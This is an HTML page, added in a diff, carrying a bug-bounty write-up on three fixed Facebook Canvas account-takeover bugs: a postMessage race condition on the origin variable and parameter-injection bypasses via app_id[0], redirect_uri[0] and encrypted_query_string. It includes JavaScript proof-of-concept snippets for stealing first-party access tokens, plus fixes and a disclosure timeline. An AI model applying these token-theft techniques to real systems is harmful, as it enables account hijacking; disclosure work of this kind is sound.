@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>More secure Facebook Canvas Part 2: More Account Takeovers | Youssef Sammouda (sam0) personal blog</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="More secure Facebook Canvas Part 2: More Account Takeovers" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Summary After publishing the write-ups about the bugs i previously found in Facebook Games Platform ( Canvas ), i thought about taking a more in depth look into the code and changes made to it after fixes as sometimes a fix of a bug can introduce another one. In this blog post, i&#39;ll write about 3 more bugs found which lead to Facebook Account Takeover. https://ysamm.com/?p=708 Bug 1: Race Condition Bug Llast time i explained in depth how some parts of the code works and actually recommended you to take a look at the rest ( fortunately you didn&#39;t ), last time i focused on the parts that construct the request to be sent to Facebook OAuth endpoint, this time i focused on how the result from that request which would contain the access_token would be delivered to the game website in the iframe. Main focus of analysis here is on the PlatformAppController module, showDialog function and more: window.addEventListener(&quot;message&quot;, function(a) { if (a.data.xdArbiterSyn) d(&quot;SecurePostMessage&quot;).sendMessageAllowAnyOrigin_UNSAFE(a.source, { xdArbiterAck: !0 }); else if (a.data.xdArbiterRegister) { var b = l.register(a.source, a.data.xdProxyName, a.data.origin, a.origin); ... __d(&quot;XdArbiter&quot;, ... { ... register: function(a, b, d, e) { e = b != null &amp;&amp; b !== &quot;&quot; ? b : h; c(&quot;Arbiter&quot;).inform(&quot;XdArbiter/register&quot;, { origin: d" />
+<meta property="og:description" content="Summary After publishing the write-ups about the bugs i previously found in Facebook Games Platform ( Canvas ), i thought about taking a more in depth look into the code and changes made to it after fixes as sometimes a fix of a bug can introduce another one. In this blog post, i&#39;ll write about 3 more bugs found which lead to Facebook Account Takeover. https://ysamm.com/?p=708 Bug 1: Race Condition Bug Llast time i explained in depth how some parts of the code works and actually recommended you to take a look at the rest ( fortunately you didn&#39;t ), last time i focused on the parts that construct the request to be sent to Facebook OAuth endpoint, this time i focused on how the result from that request which would contain the access_token would be delivered to the game website in the iframe. Main focus of analysis here is on the PlatformAppController module, showDialog function and more: window.addEventListener(&quot;message&quot;, function(a) { if (a.data.xdArbiterSyn) d(&quot;SecurePostMessage&quot;).sendMessageAllowAnyOrigin_UNSAFE(a.source, { xdArbiterAck: !0 }); else if (a.data.xdArbiterRegister) { var b = l.register(a.source, a.data.xdProxyName, a.data.origin, a.origin); ... __d(&quot;XdArbiter&quot;, ... { ... register: function(a, b, d, e) { e = b != null &amp;&amp; b !== &quot;&quot; ? b : h; c(&quot;Arbiter&quot;).inform(&quot;XdArbiter/register&quot;, { origin: d" />
+<link rel="canonical" href="http://localhost:4000/uncategorized/2022/03/04/more-secure-facebook-canvas-part-2.html" />
+<meta property="og:url" content="http://localhost:4000/uncategorized/2022/03/04/more-secure-facebook-canvas-part-2.html" />
+<meta property="og:site_name" content="Youssef Sammouda (sam0) personal blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-03-04T15:43:51+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="More secure Facebook Canvas Part 2: More Account Takeovers" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-04T15:43:51+01:00","datePublished":"2022-03-04T15:43:51+01:00","description":"Summary After publishing the write-ups about the bugs i previously found in Facebook Games Platform ( Canvas ), i thought about taking a more in depth look into the code and changes made to it after fixes as sometimes a fix of a bug can introduce another one. In this blog post, i&#39;ll write about 3 more bugs found which lead to Facebook Account Takeover. https://ysamm.com/?p=708 Bug 1: Race Condition Bug Llast time i explained in depth how some parts of the code works and actually recommended you to take a look at the rest ( fortunately you didn&#39;t ), last time i focused on the parts that construct the request to be sent to Facebook OAuth endpoint, this time i focused on how the result from that request which would contain the access_token would be delivered to the game website in the iframe. Main focus of analysis here is on the PlatformAppController module, showDialog function and more: window.addEventListener(&quot;message&quot;, function(a) { if (a.data.xdArbiterSyn) d(&quot;SecurePostMessage&quot;).sendMessageAllowAnyOrigin_UNSAFE(a.source, { xdArbiterAck: !0 }); else if (a.data.xdArbiterRegister) { var b = l.register(a.source, a.data.xdProxyName, a.data.origin, a.origin); ... __d(&quot;XdArbiter&quot;, ... { ... register: function(a, b, d, e) { e = b != null &amp;&amp; b !== &quot;&quot; ? b : h; c(&quot;Arbiter&quot;).inform(&quot;XdArbiter/register&quot;, { origin: d","headline":"More secure Facebook Canvas Part 2: More Account Takeovers","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/uncategorized/2022/03/04/more-secure-facebook-canvas-part-2.html"},"url":"http://localhost:4000/uncategorized/2022/03/04/more-secure-facebook-canvas-part-2.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Youssef Sammouda (sam0) personal blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Youssef Sammouda (sam0) personal blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">More secure Facebook Canvas Part 2: More Account Takeovers</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-03-04T15:43:51+01:00" itemprop="datePublished">Mar 4, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><!-- wp:paragraph --></p>
+<p><strong>Summary</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>After publishing the write-ups about the bugs i previously found in Facebook Games Platform ( Canvas ), i thought about taking a more in depth look into the code and changes made to it after fixes as sometimes a fix of a bug can introduce another one. In this blog post, i'll write about 3 more bugs found which lead to Facebook Account Takeover.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:embed {"url":"https://ysamm.com/?p=708","type":"wp-embed","providerNameSlug":"youssef-sammouda"} --></p>
+<figure class="wp-block-embed is-type-wp-embed is-provider-youssef-sammouda wp-block-embed-youssef-sammouda">
+<div class="wp-block-embed__wrapper">
+https://ysamm.com/?p=708
+</div>
+</figure>
+<p><!-- /wp:embed --></p>
+<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"20px"}}} --></p>
+<p style="font-size:20px"><strong>Bug 1: Race Condition Bug </strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Llast time i explained in depth how some parts of the code works and actually recommended you to take a look at the rest ( fortunately you didn't ), last time i focused on the parts that construct the request to be sent to Facebook OAuth endpoint, this time i focused on how the result from that request which would contain the access_token would be delivered to the game website in the iframe. Main focus of analysis here is on the <strong>PlatformAppController</strong> module, <strong>showDialog</strong> function and more: </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="javascript" class="language-javascript">window.addEventListener("message", function(a) {
+        if (a.data.xdArbiterSyn) d("SecurePostMessage").sendMessageAllowAnyOrigin_UNSAFE(a.source, {
+            xdArbiterAck: !0
+        });
+        else if (a.data.xdArbiterRegister) {
+            var b = l.register(a.source, a.data.xdProxyName, a.data.origin, a.origin);
+...
+__d("XdArbiter", ... {
+...
+register: function(a, b, d, e) {
+                e = b != null &amp;&amp; b !== "" ? b : h;
+                c("Arbiter").inform("XdArbiter/register", {
+                    origin: d
+
+</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:code {"lineNumbers":true} --></p>
+<pre class="wp-block-code"><code lang="javascript" class="language-javascript line-numbers">__d("PlatformAppController",...  (function(a, b, c, d, e, f, g, h) {
+...
+        u = new(c("JSONRPC"))(function(a, b) {
+            var d = b.origin || k;
+            b = b.source;
+            if (b == null) {
+                var e = c("ge")(j);
+                b = e.contentWindow
+            }
+            c("XdArbiter").send("FB_RPC:" + a, b, d)
+        });
+    c("Arbiter").subscribe("XdArbiter/register", function(a, b) {
+        q &amp;&amp; b.origin != k &amp;&amp; new(c("AsyncRequest"))().setURI("/platform/app_owned_url_check/").setData({
+            appid: q,
+            url: b.origin
+        }).setHandler(function(a) {
+            a = a.getPayload();
+            a.allowed &amp;&amp; (k = b.origin)
+        }).send()
+    });
+
+    function f(a, b, e) {
+        var f, g = a.method;
+        delete a.method;
+        delete a.access_token;
+        delete a.next;
+        delete a.context;
+        delete a.locale;
+        a.display = "async";
+        if (g == null || typeof g !== "string" || !/^[\w\-_.]+$/.test(g)) throw new Error("Malformed method name");
+        Object.keys(a).forEach(function(b) {
+            if (/[\s\x80-\x9f]/.test(b)) delete a[b];
+            else if (/\./.test(b)) {
+                var c = b.replace(/\./g, "_");
+                Object.prototype.hasOwnProperty.call(a, c) &amp;&amp; delete a[b]
+            }
+        });
+        var h = (f = this.origin) != null ? f : k;
+        typeof a.redirect_uri === "string" &amp;&amp; new(c("URI"))(a.redirect_uri).getOrigin() === new(c("URI"))(this.origin).getOrigin() &amp;&amp; (h = a.redirect_uri);
+        a.redirect_uri = h;
+        g == "apprequests" &amp;&amp; (g = "app_requests", a.context = "canvas_app_requests");
+        if (g == "pay") {
+            f = a.action;
+            (f === "purchaseitem" || f === "purchase_item") &amp;&amp; r &amp;&amp; r.usePaymentModules &amp;&amp; (g = "payment_module", a.action = "payment_module");
+            f === "purchaseiap" &amp;&amp; r &amp;&amp; r.iapUsePaymentModule &amp;&amp; (g = "payment_module_iap", a.action = "payment_module_iap");
+            f === "purchaseitem" || f === "purchase_item" || f === "purchaseiap" ? i[g] = !0 : r &amp;&amp; r.useNewPayDialog &amp;&amp; (f === "create_subscription" || f === "createsubscription" || f === "changesubscription" || f === "modifysubscription" || f === "cancelsubscription" || f === "reactivatesubscription" || f === "settlesubscription") ? (g = "payment_subscription", f === "create_subscription" &amp;&amp; (a.action = "createsubscription")) : i[g] = !1
+        }
+        g == "fbpromotion" &amp;&amp; (g = "payer_promotion", a.action = "payer_promotion");
+        g === "stream_publish" &amp;&amp; (g = "stream.publish");
+        (g == "permissions.oauth" || g == "permissions.request" || g == "oauth") &amp;&amp; (g = "oauth");
+        g === "stream.publish" &amp;&amp; (i[g] = !0);
+        a = v(a, g);
+        if (i[g]) {
+            w(g, a, function(d) {
+                d.error_code == 1340004 ? c("CurrentUser").getID() &amp;&amp; c("CurrentUser").getID() != "0" ? b(d) : new(c("URI"))("/login.php").addQueryData("next", c("URI").getRequestURI().toString()).go() : g === "app_requests" &amp;&amp; d.error_code == 1349146 ? x(g, a, b, d, h) : b(d)
+            });
+            return
+        }
+        f = new(c("URI"))("/fbml/ajax/dialog/" + g.replace(/\./g, "_")).setQueryData(a);
+        f = new(c("AsyncRequest"))().setMethod("GET").setReadOnly(!0).setURI(f).setAbortHandler(function() {
+            e(d("PlatformDialogClient").REQUEST_ABORTED_ERROR)
+        });
+        new(c("Dialog"))().setAsync(f).setModal(!0).setWideDialog(!0).show().setCloseHandler(b)
+    }
+   ...
+    function x(a, b, c, d, e) {
+        b.redirect_uri = e, w("oauth", b, function(f) {
+            f.error ? c(d) : (b.redirect_uri = e, w(a, b, function(a) {
+                c(a)
+            }))
+        })
+    }
+    u.local.setSize = b;
+    u.local.getPageInfo = e;
+    u.local.scrollTo = a;
+    u.local.showDialog = f;
+  ...
+}), 98);</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>the function <strong>f</strong> (u.local.showDialog) receives the message from the iframe and would construct the request to be sent to the OAuth endpoint ( redirect_uri and additional parameters ), also it would make sure as we pointed out in the previous post that the "Origin" URL to be included in redirect_uri parameter in the request to the OAuth endpoint would be the same one used later as <strong>targetOrigin</strong> in the postMessage method to send a message to the iframe, meaning even if we can specify Origin as https://www.instagram.com and the app_id of the Instagram application and we get a valid access_token from the server response, the access_token won't be delivered to the us since our iframe doesn't have www.instagram.com origin. Well, a bypass to this security mechanism was found :<br><br>In line 38, we can notice that there's a check whatever Origin supplied ( this.origin ) is null, this check was added as a fix to a previous bug ( 2 ), this time if the Origin is null or undefined the application should use the value of variable "<strong>k</strong>". The variable "<strong>k</strong>" is set automatically to the origin of the URL set in the game application settings ( iframe URL ), however its value can be changed later. <br><br>In line 12, we can notice that there's a listener for an "<strong>XdArbiter/register</strong>" Arbiter message , upon receiving a valid message, it would send a server request to the endpoint <strong>/platform/app_owned_url_check/</strong> with the parameters app_id ( the current app id / attacker app id ) and URL which the one we're trying to set "<strong>k</strong>" to. </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>All Facebook applications have <strong>fbconnect://success</strong> as a valid redirect_uri, we can set "<strong>k</strong>" to that value by sending a register message, and the trick here is that we can send another register message while the application is still waiting for the response to the OAuth endpoint, and change "<strong>k</strong>" back to the attacker website. Now, notice in line 4, k would be chosen but "k" with the new value and not "fbconnect://success" which would allow us to get the first party access_token.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Proof of Concept</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="javascript" class="language-javascript">window.parent.postMessage({xdArbiterRegister:true,origin:"fbconnect://success"},"*");} 
+msg = JSON.stringify({"jsonrpc":"2.0",
+                                    "method":"showDialog",
+                                    "id":1,
+                                    "params":[{"method":"permissions.oauth","app_id":"APP_ID","client_id":"APP_ID","response_type":"token"}]})
+                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + msg }
+window.parent.postMessage(fullmsg,"*")
+setTimeout(function(){
+    window.parent.postMessage({xdArbiterRegister:true,origin:"https://ysamm.com"},"*");} 
+},1000);
+</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Fix</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Meta security team fixed this bug by introducing a lock mechanism ( variable "s" ) which would initially bet set to <strong>false</strong> but in case "<strong>k</strong>" was chosen in <strong>showDialog</strong> due to an empty Origin , "s" would be set to <strong>true</strong>. The state of this variable "s" would of course be added as a condition to change or not change "<strong>k</strong>" in <strong>XdArbiter/register</strong>. Also, finally they have decided to ensure that app_id sent to the OAuth endpoint could only be the current app_id and not one specified in the cross-window message. </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"20px"}}} --></p>
+<p style="font-size:20px"><strong>Bug 2: Bypasses to previous fix</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>I won't talk much about this bug, i only introduced bypasses to the app_id restriction and also a bypass to the previous fix of the lock mechanism. This bypass introduced a rare case which needs time accuracy and other conditions to be met in order to work. The security team mitigated these bypasses and done more hardening which unfortunately didn't stop me from finding a third bug.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"20px"}}} --></p>
+<p style="font-size:20px"><strong>Bug 3: Encrypted Parameters </strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>At this point, this line of code <strong>(a.app_id = q, a.client_id = q);</strong> was added to ensure that we can't select other app_id than the current one. Of course, as you may notice in the previous blog post, the server side application has weird interpretation about parameters and that's what i focused on. I found out that in case app_id and client_id were forced we can have two other parameters from the message sent which can be named as <strong>app_id[0]</strong> ( its value is an empty string ). Adding this parameter would revoke app_id and we would now get a message that no app_id was specified. I noticed the same behavior with redirect_uri which is carefully generated, in case we add another parameter called <strong>redirect_uri[0]</strong>, this would result in redirect_uri being revoked. </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>However, even with this server side behavior we can't actually specify new values for app_id and redirect_uri , we can only revoke them. Likely, i found a new parameter called <strong>encrypted_query_string</strong>. This parameter would contain a set of other parameters and their values but in an encrypted format which can later be decrypted server-side. How would we generate the encrypted string with our desired app_id and redirect_uri? Well it's simple as visiting https://facebook.com/dialog/oauth?app_id=APP_ID&amp;redirect_uri=REDIRECT_URI . Here you should notice that we're requesting <strong>facebook.com</strong> domain and not <strong>www.facebook.com</strong>. A redirect to https://www.facebook.com/dialog/oauth?encrypted_query_string=<strong>ENCODED_FORMAT</strong> would be made.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Here for our attack to work, we specify APP_ID to the Instagram app_id and redirect_uri to a valid redirect_uri of the Instagram application.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Proof of concept </strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="javascript" class="language-javascript">msg = JSON.stringify({"jsonrpc":"2.0",
+                                    "method":"showDialog",
+                                    "id":1,
+                                    "params":[{"method":"permissions.oauth","app_id":"Random",
+"client_id":"Random","app_id[0]":"","redirect_uri":"Random",
+"redirect_uri[0]":"","response_type":"token",
+"encrypted_query_string":"<strong>ENCODED_FORMAT</strong>"}]})
+                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + msg , origin:"https://ysamm.com"}
+window.parent.postMessage(fullmsg,"*")</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>Notice here that we set app_id, client_id and redirect_uri in the message even though their values are going to be replaced because we need to keep this order for the parameters in the request to the OAuth Endpoint. </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Fix</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>This time, finally Meta decided to apply the obvious fix and limit the control we have over the OAuth request. A whitelist of allowed parameters was added and the application would filter out any other parameters, of course with app_id and client_id always set to the current app_id.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Timeline</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:list {"ordered":true} --></p>
+<ol>
+<li>Sep 23, 2021&mdash; Report Sent <br><meta http-equiv="content-type" content="text/html; charset=utf-8">Sep 24, 2021&mdash;  Acknowledged by Facebook<br><meta http-equiv="content-type" content="text/html; charset=utf-8">Sep 28, 2021&mdash; Fixed by Facebook<br>Oct 14, 2021 &mdash; $42000 bounty  awarded by Facebook.</li>
+<li>Oct 29, 2021&mdash; Report Sent <br><meta http-equiv="content-type" content="text/html; charset=utf-8">Oct 29, 2021&mdash;  Acknowledged by Facebook<br>Dec 10, 2021&mdash; Fixed by Facebook<br>Dec 22, 2021 &mdash; $12500 bounty  awarded by Facebook.</li>
+<li>Jan 10, 2022&mdash; Report Sent <br><meta http-equiv="content-type" content="text/html; charset=utf-8">Jan 11, 2022&mdash;  Acknowledged by Facebook<br><meta http-equiv="content-type" content="text/html; charset=utf-8">Jan 24, 2022&mdash; Fixed by Facebook<br>Mar 3, 2022&mdash; $43750 bounty  awarded by Facebook.</li>
+</ol>
+<p><!-- /wp:list --></p>
+
+  </div><a class="u-url" href="/uncategorized/2022/03/04/more-secure-facebook-canvas-part-2.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Youssef Sammouda (sam0) personal blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Youssef Sammouda (sam0) personal blog</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">samm0uda</span></a></li><li><a href="https://www.twitter.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">samm0uda</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
